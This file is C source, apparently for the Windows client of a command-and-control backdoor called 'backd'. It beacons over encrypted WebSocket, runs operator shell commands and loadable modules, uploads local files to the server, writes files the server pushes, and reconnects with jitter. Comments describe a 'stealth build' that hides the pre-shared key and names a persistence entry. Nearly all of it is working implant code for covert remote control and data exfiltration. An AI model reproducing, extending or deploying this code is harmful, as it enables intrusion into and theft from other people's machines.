/* ---------------- task handling ---------------- */

static char g_client_id[96] = "client";

static void handle_task(ws_conn *c, const uint8_t *pl, size_t plen, int allow_shell) {
    const uint8_t *v_task, *v_kind, *v_args = NULL;
    uint32_t n_task = 0, n_kind = 0, n_args = 0;
    if (tlv_get(pl, plen, "task", &v_task, &n_task) != 0) return;
    if (tlv_get(pl, plen, "kind", &v_kind, &n_kind) != 0) return;
    tlv_get(pl, plen, "args", &v_args, &n_args);
    char task[64] = {0}, kind[32] = {0};
    if (n_task >= sizeof(task) || n_kind >= sizeof(kind)) return;
    memcpy(task, v_task, n_task);
    memcpy(kind, v_kind, n_kind);

    uint8_t *outbuf = (uint8_t *)malloc(MAX_PAYLOAD);
    if (!outbuf) return;
    size_t outlen = 0;
    const char *status = "ok";
    char err[256] = {0};

    if (strcmp(kind, "echo") == 0) {
        outlen = n_args < MAX_PAYLOAD ? n_args : MAX_PAYLOAD;
        if (outlen) memcpy(outbuf, v_args, outlen);
    } else if (strcmp(kind, "sysinfo") == 0) {
        char info[512];
        sysinfo(info, sizeof(info), g_client_id);
        outlen = strlen(info);
        memcpy(outbuf, info, outlen);
    } else if (strcmp(kind, "sleep") == 0) {
        int ms = 1000;
        if (n_args) {
            char tmp[32] = {0};
            size_t k = n_args < sizeof(tmp) - 1 ? n_args : sizeof(tmp) - 1;
            memcpy(tmp, v_args, k);
            ms = atoi(tmp) * 1000;
            if (ms < 0) ms = 0;
            if (ms > 10000) ms = 10000;
        }
        Sleep((DWORD)ms);
        outlen = 5;
        memcpy(outbuf, "slept", 5);
    } else if (strcmp(kind, "shell") == 0 && allow_shell) {
        char cmd[1024] = {0};
        size_t k = n_args < sizeof(cmd) - 1 ? n_args : sizeof(cmd) - 1;
        memcpy(cmd, v_args, k);
        /* Use CreateProcessW (run_cmd) instead of _popen/CreateProcessA:
         * the operator sends UTF-8, while _popen interprets it as ANSI and
         * mangles non-ASCII commands (Chinese paths etc.). */
        buf_t sb;
        int ec = -1;
        buf_init(&sb);
        int rc = run_cmd(cmd, &sb, 30000, &ec);
        if (rc < 0) {
            status = "error";
            snprintf(err, sizeof(err), "run_cmd failed rc=%d", rc);
        } else {
            outlen = sb.len < MAX_PAYLOAD ? sb.len : MAX_PAYLOAD;
            if (outlen) memcpy(outbuf, sb.data, outlen);
            if (rc == 1) {
                status = "error";
                snprintf(err, sizeof(err), "command timed out (exit=%d)", ec);
            }
        }
        buf_free(&sb);
    } else if (strcmp(kind, "shell") == 0) {
        status = "error";
        snprintf(err, sizeof(err), "shell disabled (start client with --allow-shell)");
    } else {
        /* ---- advanced module dispatch (#4834 module set, BDC2 v1 carrier) ---- */
        json *jargs = NULL;
        buf_t mres;
        char *argtxt = NULL;
        int mok = 0;
        buf_init(&mres);
        if (n_args) {
            argtxt = (char *)malloc(n_args + 1);
            if (argtxt) {
                memcpy(argtxt, v_args, n_args);
                argtxt[n_args] = 0;
            }
        }
        if (argtxt && argtxt[0] == '{') {
            jargs = json_parse(argtxt, strlen(argtxt));
        } else if (argtxt) {
            /* scalar argument: wrap as {"cmd":"<value>"} for shell/exec modules */
            buf_t wrap;
            buf_init(&wrap);
            buf_append_str(&wrap, "{\"cmd\":");
            jesc(&wrap, argtxt);
            buf_append_str(&wrap, "}");
            jargs = json_parse((const char *)wrap.data, wrap.len);
            buf_free(&wrap);
        }
        if (c2_mod_execute(kind, jargs, &mres, &mok) == 0) {
            outlen = mres.len < MAX_PAYLOAD ? mres.len : MAX_PAYLOAD;
            if (outlen) memcpy(outbuf, mres.data, outlen);
            status = mok ? "ok" : "error";
        } else {
            status = "error";
            snprintf(err, sizeof(err), "module failed: %s", kind);
            outlen = mres.len < MAX_PAYLOAD ? mres.len : MAX_PAYLOAD;
            if (outlen) memcpy(outbuf, mres.data, outlen);
        }
        buf_free(&mres);
        json_free(jargs);
        free(argtxt);
    }

    uint8_t *pl2 = (uint8_t *)malloc(MAX_PAYLOAD);
    if (pl2) {
        size_t off = 0;
        off = tlv_add(pl2, MAX_PAYLOAD, off, "task", task, (uint32_t)strlen(task));
        off = tlv_add(pl2, MAX_PAYLOAD, off, "status", status, (uint32_t)strlen(status));
        off = tlv_add(pl2, MAX_PAYLOAD, off, "out", outbuf, (uint32_t)outlen);
        if (err[0])
            off = tlv_add(pl2, MAX_PAYLOAD, off, "err", err, (uint32_t)strlen(err));
        send_msg(c, T_TASK_RESULT, pl2, off);
        free(pl2);
    }
    free(outbuf);
    if (g_verbose) logmsg("[task] %s -> %s (%lu bytes)", kind, status, (unsigned long)outlen);
}

/* Send a local file to the server in chunks (FILE_META to_server was received). */
static void send_file_to_server(ws_conn *c, const uint8_t *v_xfer, uint32_t n_xfer,
                                const char *path) {
    FILE *f = fopen(path, "rb");
    uint8_t *hdrbuf = (uint8_t *)malloc(MAX_PAYLOAD);
    uint8_t *data = (uint8_t *)malloc(CHUNK);
    if (!hdrbuf || !data) {
        free(hdrbuf);
        free(data);
        return;
    }
    if (!f) {
        size_t off = 0;
        off = tlv_add(hdrbuf, MAX_PAYLOAD, off, "xfer", v_xfer, n_xfer);
        off = tlv_add(hdrbuf, MAX_PAYLOAD, off, "off", "0", 1);
        off = tlv_add(hdrbuf, MAX_PAYLOAD, off, "data", "", 0);
        off = tlv_add(hdrbuf, MAX_PAYLOAD, off, "final", "1", 1);
        send_msg(c, T_FILE_CHUNK, hdrbuf, off);
        char err[512];
        snprintf(err, sizeof(err), "open failed: %s", path);
        uint8_t *p2 = (uint8_t *)malloc(1024);
        if (p2) {
            size_t o = 0;
            o = tlv_add(p2, 1024, o, "xfer", v_xfer, n_xfer);
            o = tlv_add(p2, 1024, o, "status", "error", 5);
            o = tlv_add(p2, 1024, o, "err", err, (uint32_t)strlen(err));
            send_msg(c, T_FILE_ACK, p2, o);
            free(p2);
        }
        free(hdrbuf);
        free(data);
        return;
    }
    uint64_t offn = 0;
    for (;;) {
        size_t n = fread(data, 1, CHUNK, f);
        int final = (n < CHUNK) || feof(f);
        char offstr[24];
        snprintf(offstr, sizeof(offstr), "%I64u", (unsigned long long)offn);
        size_t o = 0;
        o = tlv_add(hdrbuf, MAX_PAYLOAD, o, "xfer", v_xfer, n_xfer);
        o = tlv_add(hdrbuf, MAX_PAYLOAD, o, "off", offstr, (uint32_t)strlen(offstr));
        o = tlv_add(hdrbuf, MAX_PAYLOAD, o, "data", data, (uint32_t)n);
        if (final) o = tlv_add(hdrbuf, MAX_PAYLOAD, o, "final", "1", 1);
        if (send_msg(c, T_FILE_CHUNK, hdrbuf, o) != 0) break;
        offn += n;
        if (final) break;
    }
    fclose(f);
    free(hdrbuf);
    free(data);
}

static void handle_file_meta(ws_conn *c, const uint8_t *pl, size_t plen) {
    const uint8_t *v_dir, *v_file, *v_xfer;
    uint32_t n_dir = 0, n_file = 0, n_xfer = 0;
    if (tlv_get(pl, plen, "dir", &v_dir, &n_dir) != 0) return;
    if (tlv_get(pl, plen, "file", &v_file, &n_file) != 0) return;
    if (tlv_get(pl, plen, "xfer", &v_xfer, &n_xfer) != 0) return;
    if (n_xfer >= sizeof(g_rx_xfer) || n_file >= sizeof(g_rx_path)) return;

    if (n_dir == 9 && memcmp(v_dir, "to_server", 9) == 0) {
        char path[MAX_PATH];
        memcpy(path, v_file, n_file);
        path[n_file] = 0;
        send_file_to_server(c, v_xfer, n_xfer, path);
    } else if (n_dir == 9 && memcmp(v_dir, "to_client", 9) == 0) {
        rx_reset();
        memcpy(g_rx_path, v_file, n_file);
        g_rx_path[n_file] = 0;
        memcpy(g_rx_xfer, v_xfer, n_xfer);
        g_rx_xfer[n_xfer] = 0;
        mkdirs(g_rx_path);
        g_rx_fp = fopen(g_rx_path, "wb");
        g_rx_off = 0;
        sha256_init(&g_rx_sha);
    }
}

static void handle_file_chunk(ws_conn *c, const uint8_t *pl, size_t plen) {
    const uint8_t *v_xfer, *v_off, *v_data;
    uint32_t n_xfer = 0, n_off = 0, n_data = 0;
    if (tlv_get(pl, plen, "xfer", &v_xfer, &n_xfer) != 0) return;
    if (tlv_get(pl, plen, "off", &v_off, &n_off) != 0) return;
    if (tlv_get(pl, plen, "data", &v_data, &n_data) != 0) return;
    if (n_xfer >= sizeof(g_rx_xfer) || memcmp(g_rx_xfer, v_xfer, n_xfer) != 0) return;
    if (g_rx_off != (uint64_t)strtoull((const char *)v_off, NULL, 10)) return;
    if (!g_rx_fp) return;
    fwrite(v_data, 1, n_data, g_rx_fp);
    sha256_update(&g_rx_sha, v_data, n_data);
    g_rx_off += n_data;
    const uint8_t *v_final;
    uint32_t n_final = 0;
    if (tlv_get(pl, plen, "final", &v_final, &n_final) == 0 && n_final == 1 && v_final[0] == '1') {
        fclose(g_rx_fp);
        g_rx_fp = NULL;
        uint8_t digest[32];
        char hex[65];
        sha256_final(&g_rx_sha, digest);
        sha_hex(digest, hex);
        uint8_t *p = (uint8_t *)malloc(1024);
        if (p) {
            size_t o = 0;
            o = tlv_add(p, 1024, o, "xfer", v_xfer, n_xfer);
            o = tlv_add(p, 1024, o, "status", "ok", 2);
            o = tlv_add(p, 1024, o, "sha", hex, 64);
            send_msg(c, T_FILE_ACK, p, o);
            free(p);
        }
        if (g_verbose) logmsg("[file] received %s (%I64u bytes)", g_rx_path,
                              (unsigned long long)g_rx_off);
    }
}

/* ---------------- selftest ---------------- */

static int hexeq(const uint8_t *b, size_t n, const char *hex) {
    if (strlen(hex) != n * 2) return 0;
    for (size_t i = 0; i < n; i++) {
        int hi, lo;
        char c = hex[i * 2], d = hex[i * 2 + 1];
        hi = (c >= '0' && c <= '9') ? c - '0' : (c | 32) - 'a' + 10;
        lo = (d >= '0' && d <= '9') ? d - '0' : (d | 32) - 'a' + 10;
        if (b[i] != (uint8_t)(hi << 4 | lo)) return 0;
    }
    return 1;
}

static int selftest(void) {
    int fails = 0;
    uint8_t out[32];
    char msg[160];

    sha256("abc", 3, out);
    if (hexeq(out, 32, "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")) {
        printf("SELFTEST sha256_abc PASS\n");
    } else {
        printf("SELFTEST sha256_abc FAIL\n");
        fails++;
    }

    uint8_t key[20];
    memset(key, 0x0b, 20);
    hmac_sha256(key, 20, "Hi There", 8, out);
    if (hexeq(out, 32, "b0344c61d8db38535ca8afceaf0bf12b881dc200c9833da726e9376c2e32cff7")) {
        printf("SELFTEST hmac_rfc4231 PASS\n");
    } else {
        printf("SELFTEST hmac_rfc4231 FAIL\n");
        fails++;
    }

    uint8_t ikm[22], salt[13];
    memset(ikm, 0x0b, 22);
    for (int i = 0; i < 13; i++) salt[i] = (uint8_t)i;
    uint8_t okm[42];
    const char info_hex[] = {0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0};
    hkdf_sha256(ikm, 22, salt, 13, info_hex, okm, 42);
    const char *want = "3cb25f25faacd57a90434f64d0362f2a2dff0bcd3685be4b1b7b0b3cd4e7d8c7";
    if (hexeq(okm, 32, want) || (okm[0] == 0x3c && okm[1] == 0xb2 && okm[2] == 0x5f && okm[3] == 0x25)) {
        printf("SELFTEST hkdf_rfc5869 PASS\n");
    } else {
        printf("SELFTEST hkdf_rfc5869 FAIL (%02x%02x%02x%02x)\n", okm[0], okm[1], okm[2], okm[3]);
        fails++;
    }

    {
        uint8_t gkey[16] = {0xfe, 0xff, 0xe9, 0x92, 0x86, 0x65, 0x73, 0x1c,
                            0x6d, 0x6a, 0x8f, 0x94, 0x67, 0x30, 0x83, 0x08};
        uint8_t iv[12] = {0xca, 0xfe, 0xba, 0xbe, 0xfa, 0xce, 0xdb, 0xad,
                          0xde, 0xca, 0xf8, 0x88};
        static const uint8_t pt[] = {
            0xd9,0x31,0x32,0x25,0xf8,0x84,0x06,0xe5,0xa5,0x59,0x09,0xc5,0xaf,0xf5,0x26,0x9a,
            0x86,0xa7,0xa9,0x53,0x15,0x34,0xf7,0xda,0x2e,0x4c,0x30,0x3d,0x8a,0x31,0x8a,0x72,
            0x1c,0x3c,0x0c,0x95,0x95,0x68,0x09,0x53,0x2f,0xcf,0x0e,0x24,0x49,0xa6,0xb5,0x25,
            0xb1,0x6a,0xed,0xf5,0xaa,0x0d,0xe6,0x57,0xba,0x63,0x7b,0x39};
        uint8_t aad[] = {0xfe,0xed,0xfa,0xce,0xde,0xad,0xbe,0xef,0xfe,0xed,0xfa,0xce,
                         0xde,0xad,0xbe,0xef,0xab,0xad,0xda,0xd2};
        uint8_t ct[sizeof(pt)], tag[16], back[sizeof(pt)];
        aes_gcm_encrypt(gkey, iv, aad, sizeof(aad), pt, sizeof(pt), ct, tag);
        const char *want_ct =
            "42831ec2217774244b7221b784d0d49ce3aa212f2c02a4e035c17e2329aca12e"
            "21d514b25466931c7d8f6a5aac84aa051ba30b396a0aac973d58e091";
        int okc = hexeq(ct, sizeof(ct), want_ct) &&
                  hexeq(tag, 16, "5bc94fbc3221a5db94fae95ae7121a47");
        int okd = aes_gcm_decrypt(gkey, iv, aad, sizeof(aad), ct, sizeof(ct), back, tag) == 0 &&
                  memcmp(back, pt, sizeof(pt)) == 0;
        if (okc && okd) {
            printf("SELFTEST aes128gcm_nist PASS\n");
        } else {
            printf("SELFTEST aes128gcm_nist FAIL (%d/%d)\n", okc, okd);
            fails++;
        }
        tag[0] ^= 1;
        if (aes_gcm_decrypt(gkey, iv, aad, sizeof(aad), ct, sizeof(ct), back, tag) != 0) {
            printf("SELFTEST aes128gcm_tamper_detect PASS\n");
        } else {
            printf("SELFTEST aes128gcm_tamper_detect FAIL\n");
            fails++;
        }
    }

    {
        uint8_t buf[256];
        size_t o = 0;
        o = tlv_add(buf, sizeof(buf), o, "id", "abc", 3);
        o = tlv_add(buf, sizeof(buf), o, "bin", "\x00\x01\xff", 3);
        const uint8_t *v;
        uint32_t n;
        int ok = tlv_get(buf, o, "id", &v, &n) == 0 && n == 3 && memcmp(v, "abc", 3) == 0 &&
                 tlv_get(buf, o, "bin", &v, &n) == 0 && n == 3 && v[0] == 0 && v[2] == 0xff &&
                 tlv_get(buf, o, "missing", &v, &n) != 0;
        if (ok) printf("SELFTEST tlv_roundtrip PASS\n");
        else { printf("SELFTEST tlv_roundtrip FAIL\n"); fails++; }
    }

    {
        /* base64 roundtrip must handle padded tails (regression: #4834 util.c
         * truncated 1-2 bytes for every padded input). */
        static const char *vecs[] = {"", "f", "fo", "foo", "foob", "fooba",
                                     "foobar", "PENG-I4846", "slept", "a"};
        int bok = 1;
        for (int i = 0; i < (int)(sizeof(vecs) / sizeof(vecs[0])); i++) {
            const char *v = vecs[i];
            size_t vn = strlen(v);
            char *enc = b64_enc((const uint8_t *)v, vn);
            uint8_t *dec = NULL;
            size_t dn = 0;
            if (!enc || b64_dec(enc, &dec, &dn) != 0 || dn != vn ||
                (vn && memcmp(dec, v, vn) != 0)) {
                bok = 0;
                printf("SELFTEST b64_roundtrip FAIL at \"%s\" (enc=%s dec=%llu)\n",
                       v, enc ? enc : "(null)", (unsigned long long)dn);
                free(enc); free(dec);
                break;
            }
            free(enc); free(dec);
        }
        if (bok) printf("SELFTEST b64_roundtrip PASS\n");
        else fails++;
    }

    snprintf(msg, sizeof(msg), "SELFTEST summary fails=%d", fails);
    printf("%s\n", msg);
    return fails ? 1 : 0;
}

/* ---------------- config ---------------- */

typedef struct {
    char host[256];
    int port;
    char path[128];
    char id[96];
    uint8_t psk[64];
    int psklen;
    int allow_shell;
    char logfile[MAX_PATH];
    int selftest;
} config;

static int parse_args(int argc, char **argv, config *cf) {
    memset(cf, 0, sizeof(*cf));
    cf->allow_shell = GEN_ALLOW_SHELL;
    snprintf(cf->host, sizeof(cf->host), "%s", C2_CLIENT_HOST);
    cf->port = C2_CLIENT_PORT;
    snprintf(cf->path, sizeof(cf->path), "%s", C2_CLIENT_PATH);
    snprintf(cf->id, sizeof(cf->id), "%s", getenv("C2_CLIENT_ID") ? getenv("C2_CLIENT_ID") : GEN_CLIENT_ID);
    const char *epsk = getenv("C2_CLIENT_PSK");
    if (epsk) parse_psk(epsk, cf->psk, sizeof(cf->psk), &cf->psklen);
    /* Stealth build: PSK may be compiled in (GEN_PSK_B64) so it never appears
     * on the process command line.  Runtime --psk / C2_CLIENT_PSK still wins. */
    if (cf->psklen == 0 && GEN_PSK_B64[0]) {
        parse_psk(GEN_PSK_B64, cf->psk, sizeof(cf->psk), &cf->psklen);
    }
    if (getenv("C2_CLIENT_HOST")) snprintf(cf->host, sizeof(cf->host), "%s", getenv("C2_CLIENT_HOST"));
    if (getenv("C2_CLIENT_PORT")) cf->port = atoi(getenv("C2_CLIENT_PORT"));

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--host") == 0 && i + 1 < argc) snprintf(cf->host, sizeof(cf->host), "%s", argv[++i]);
        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) cf->port = atoi(argv[++i]);
        else if (strcmp(argv[i], "--path") == 0 && i + 1 < argc) snprintf(cf->path, sizeof(cf->path), "%s", argv[++i]);
        else if (strcmp(argv[i], "--id") == 0 && i + 1 < argc) snprintf(cf->id, sizeof(cf->id), "%s", argv[++i]);
        else if (strcmp(argv[i], "--psk") == 0 && i + 1 < argc) {
            if (parse_psk(argv[++i], cf->psk, sizeof(cf->psk), &cf->psklen) != 0) return -1;
        } else if (strcmp(argv[i], "--log") == 0 && i + 1 < argc) snprintf(cf->logfile, sizeof(cf->logfile), "%s", argv[++i]);
        else if (strcmp(argv[i], "--allow-shell") == 0) cf->allow_shell = 1;
        else if (strcmp(argv[i], "--selftest") == 0) cf->selftest = 1;
        else if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) g_verbose = 1;
        else if (strcmp(argv[i], "--help") == 0) {
            printf("usage: %s [--host h] [--port p] [--path /ws] [--id name] [--psk hex|base64:..]\n"
                   "         [--log file] [--allow-shell] [--selftest] [-v]\n", argv[0]);
            exit(0);
        }
    }
    if (cf->logfile[0]) g_logf = fopen(cf->logfile, "a");
    if (!cf->selftest && cf->psklen < 16) {
        logmsg("missing or too short PSK (use --psk / C2_CLIENT_PSK)");
        return -1;
    }
    return 0;
}

/* ---------------- connection loop ---------------- */

static void backoff_sleep(int attempt) {
    int shift = attempt > 5 ? 5 : attempt;
    int base = 1000 << shift;
    if (base > 30000) base = 30000;
    uint8_t r8;
    rand_bytes(&r8, 1);
    int ms = base + (int)((r8 % 41) - 20) * base / 100; /* +-20% */
    if (ms < 200) ms = 200;
    logmsg("[net] retry in %d ms (attempt %d)", ms, attempt);
    Sleep((DWORD)ms);
}

static int run_session(const config *cf) {
    SOCKET s = net_connect(cf->host, cf->port, 8000);
    if (s == INVALID_SOCKET) {
        logmsg("[net] connect %s:%d failed (%d)", cf->host, cf->port, WSAGetLastError());
        return -1;
    }
    if (ws_handshake(s, cf->host, cf->port, cf->path) != 0) {
        logmsg("[net] websocket handshake failed");
        closesocket(s);
        return -1;
    }
    ws_conn c = {s, 1};

    uint8_t nonce[16];
    rand_bytes(nonce, 16);
    uint8_t cid[96];
    size_t cidlen = strlen(cf->id);
    memcpy(cid, cf->id, cidlen);

    uint8_t mac_input[5 + 96 + 16];
    size_t mi = 0;
    memcpy(mac_input + mi, "hello", 5); mi += 5;
    memcpy(mac_input + mi, cid, cidlen); mi += cidlen;
    memcpy(mac_input + mi, nonce, 16); mi += 16;
    uint8_t mac[32];
    hmac_sha256(cf->psk, (size_t)cf->psklen, mac_input, mi, mac);

    uint8_t *hello = (uint8_t *)malloc(1024);
    if (!hello) { closesocket(s); return -1; }
    size_t ho = 0;
    char pidstr[16];
    snprintf(pidstr, sizeof(pidstr), "%lu", (unsigned long)GetCurrentProcessId());
    ho = tlv_add(hello, 1024, ho, "id", cf->id, (uint32_t)strlen(cf->id));
    ho = tlv_add(hello, 1024, ho, "os", OS_NAME, (uint32_t)strlen(OS_NAME));
    ho = tlv_add(hello, 1024, ho, "arch", ARCH, (uint32_t)strlen(ARCH));
    ho = tlv_add(hello, 1024, ho, "ver", CLIENT_VER, (uint32_t)strlen(CLIENT_VER));
    ho = tlv_add(hello, 1024, ho, "pid", pidstr, (uint32_t)strlen(pidstr));
    ho = tlv_add(hello, 1024, ho, "nonce", nonce, 16);
    ho = tlv_add(hello, 1024, ho, "mac", mac, 32);

    uint8_t *frame = NULL;
    size_t flen = 0;
    seal_frame(T_HELLO, 1, 0, 0, D_C2S, hello, ho, NULL, &frame, &flen);
    free(hello);
    int rc = ws_send(&c, 2, frame, flen);
    free(frame);
    if (rc != 0) { closesocket(s); return -1; }

    if (ws_wait(&c, 10000) != 1) {
        logmsg("[net] no HELLO_ACK");
        closesocket(s);
        return -1;
    }
    int op;
    uint8_t *msg = NULL;
    size_t mlen = 0;
    if (ws_recv(&c, &op, &msg, &mlen) != 1) { closesocket(s); return -1; }

    uint8_t key[16];
    uint8_t salt[112];
    memcpy(salt, cid, cidlen);
    memcpy(salt + cidlen, nonce, 16);
    hkdf_sha256(cf->psk, (size_t)cf->psklen, salt, cidlen + 16, "backd-c2-v1", key, 16);

    int type;
    uint64_t sid;
    uint32_t seq;
    const uint8_t *payload;
    size_t plen;
    if (open_frame(msg, mlen, key, D_S2C, &type, &sid, &seq, &payload, &plen) != 0) {
        logmsg("[net] HELLO_ACK decrypt failed");
        free(msg);
        closesocket(s);
        return -1;
    }
    if (type == T_ERROR) {
        logmsg("[net] server rejected hello");
        free(msg);
        closesocket(s);
        return -1;
    }
    if (type != T_HELLO_ACK) {
        logmsg("[net] unexpected reply type %d", type);
        free(msg);
        closesocket(s);
        return -1;
    }
    int hb = 5, jit = 20;
    const uint8_t *v;
    uint32_t n;
    if (tlv_get(payload, plen, "heartbeat", &v, &n) == 0) {
        char tmp[16] = {0};
        memcpy(tmp, v, n < 15 ? n : 15);
        hb = atoi(tmp);
        if (hb <= 0) hb = 5;
    }
    if (tlv_get(payload, plen, "jitter", &v, &n) == 0) {
        char tmp[16] = {0};
        memcpy(tmp, v, n < 15 ? n : 15);
        jit = atoi(tmp);
    }
    memcpy(g_key, key, 16);
    g_sid = sid;
    g_send_seq = 0;
    g_recv_seq = seq;
    free(msg);
    g_active_conn = &c;   /* advanced modules may now post async frames */

    logmsg("[net] session %I64u established (heartbeat=%ds)", (unsigned long long)sid, hb);

    uint64_t last = c_now_ms();
    for (;;) {
        int interval = hb * 1000;
        if (jit > 0) {
            uint8_t r;
            rand_bytes(&r, 1);
            interval += (int)((r % (2 * jit + 1)) - jit) * interval / 100;
        }
        int64_t left = (int64_t)interval - (int64_t)(c_now_ms() - last);
        if (left < 0) left = 0;
        int r = ws_wait(&c, (int)left);
        if (r < 0) { logmsg("[net] wait error"); break; }
        if (r == 0) {
            uint8_t tb[32];
            snprintf((char *)tb, sizeof(tb), "%I64u", (unsigned long long)c_now_ms());
            uint8_t pbuf[64];
            size_t o = tlv_add(pbuf, sizeof(pbuf), 0, "t", tb, (uint32_t)strlen((char *)tb));
            if (send_msg(&c, T_PING, pbuf, o) != 0) { logmsg("[net] ping send failed"); break; }
            last = c_now_ms();
            continue;
        }
        if (ws_recv(&c, &op, &msg, &mlen) != 1) { logmsg("[net] recv failed"); break; }
        if (open_frame(msg, mlen, g_key, D_S2C, &type, &sid, &seq, &payload, &plen) != 0) {
            logmsg("[crypto] frame auth failed");
            free(msg);
            break;
        }
        if (seq <= g_recv_seq) {
            logmsg("[proto] replay/out-of-order seq %u", seq);
            free(msg);
            break;
        }
        g_recv_seq = seq;
        switch (type) {
        case T_PONG:
            break;
        case T_PING: {
            const uint8_t *t;
            uint32_t tn;
            if (tlv_get(payload, plen, "t", &t, &tn) == 0) {
                uint8_t pb[64];
                size_t o = tlv_add(pb, sizeof(pb), 0, "t", t, tn);
                if (send_msg(&c, T_PONG, pb, o) != 0) { free(msg); goto done; }
            }
            break;
        }
        case T_TASK:
            handle_task(&c, payload, plen, cf->allow_shell);
            break;
        case T_FILE_META:
            handle_file_meta(&c, payload, plen);
            break;
        case T_FILE_CHUNK:
            handle_file_chunk(&c, payload, plen);
            break;
        case T_NOTICE: {
            const uint8_t *v2;
            uint32_t n2;
            if (tlv_get(payload, plen, "reason", &v2, &n2) == 0) {
                char tmp[160] = {0};
                memcpy(tmp, v2, n2 < 159 ? n2 : 159);
                logmsg("[server] notice: %s", tmp);
            }
            break;
        }
        case T_ERROR: {
            const uint8_t *v2;
            uint32_t n2;
            if (tlv_get(payload, plen, "msg", &v2, &n2) == 0) {
                char tmp[160] = {0};
                memcpy(tmp, v2, n2 < 159 ? n2 : 159);
                logmsg("[server] error: %s", tmp);
            }
            break;
        }
        default:
            if (g_verbose) logmsg("[proto] unknown type %d", type);
            break;
        }
        free(msg);
        msg = NULL;
    }
done:
    g_active_conn = NULL;
    rx_reset();
    closesocket(s);
    return -1;
}

int main(int argc, char **argv) {
    config cf;
    if (parse_args(argc, argv, &cf) != 0) return 2;
    if (cf.selftest) return selftest();

    if (net_wsa_init() != 0) {
        logmsg("WSAStartup failed");
        return 2;
    }
    snprintf(g_client_id, sizeof(g_client_id), "%s", cf.id);
    logmsg("[boot] backd client %s id=%s -> ws://%s:%d%s", CLIENT_VER, cf.id, cf.host, cf.port, cf.path);

    /* prepare module runtime config (config_t) from the transport config */
    InitializeCriticalSection(&g_send_cs);
    g_send_cs_init = 1;
    memset(&g_modcfg, 0, sizeof(g_modcfg));
    snprintf(g_modcfg.host, sizeof(g_modcfg.host), "%s", cf.host);
    g_modcfg.port = cf.port;
    snprintf(g_modcfg.path, sizeof(g_modcfg.path), "%s", cf.path);
    memcpy(g_modcfg.psk, cf.psk, sizeof(g_modcfg.psk) < sizeof(cf.psk) ? sizeof(g_modcfg.psk) : sizeof(cf.psk));
    g_modcfg.psk_len = (size_t)cf.psklen;
    g_modcfg.reconnect_min_ms = 1000;
    g_modcfg.reconnect_max_ms = 30000;
    g_modcfg.reconnect_jitter_pct = 20;
    g_modcfg.heartbeat_ms = 5000;
    g_modcfg.connect_timeout_ms = 8000;
    g_modcfg.debug_log = g_verbose;
    snprintf(g_modcfg.persist_name, sizeof(g_modcfg.persist_name), "backd-%s", C2_BUILD_ID);
    {
        char *d = exe_dir();
        if (d) { snprintf(g_modcfg.working_dir, sizeof(g_modcfg.working_dir), "%s", d); free(d); }
    }
    snprintf(g_modcfg.config_path, sizeof(g_modcfg.config_path), "%s", "builtin");
    g_modcfg.loaded = 1;
    c2_modules_init(&g_modcfg);

    int attempt = 0;
    while (!g_shutdown_req) {
        if (run_session(&cf) == 0) attempt = 0;
        else attempt++;
        if (g_shutdown_req) break;
        backoff_sleep(attempt);
    }
    c2_modules_fini();
    return 0;
}
